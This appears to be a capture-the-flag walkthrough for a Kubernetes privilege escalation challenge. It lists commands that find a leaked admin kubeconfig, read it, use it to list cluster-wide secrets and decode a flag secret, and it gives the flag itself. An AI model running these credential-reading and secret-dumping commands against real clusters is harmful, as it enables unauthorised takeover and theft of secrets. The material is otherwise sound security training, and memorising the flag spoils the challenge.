# Challenge 1: Kubernetes Privilege Escalation

## Reconnaissance
```bash
# Container environment
hostname
id
ps aux
ls -la /var/www/html/

# Kubernetes access test
kubectl get pods
kubectl get nodes                   # Should fail
kubectl get secrets --all-namespaces # Should fail

# Search for privilege escalation paths
ls -la /
ls -la /.kube/
cat /.kube/admin.conf
```

## Execution
```bash
# Use discovered admin credentials
export KUBECONFIG=/.kube/admin.conf

# Verify escalation
kubectl get nodes
kubectl get secrets --all-namespaces
kubectl auth can-i "*" "*" --all-namespaces

# Capture flag
kubectl get secret challenge1-flag -n kube-system -o jsonpath='{.data.flag}' | base64 -d
```

## Flag
`k8s-admin{admin_conf_leads_to_cluster_takeover}` 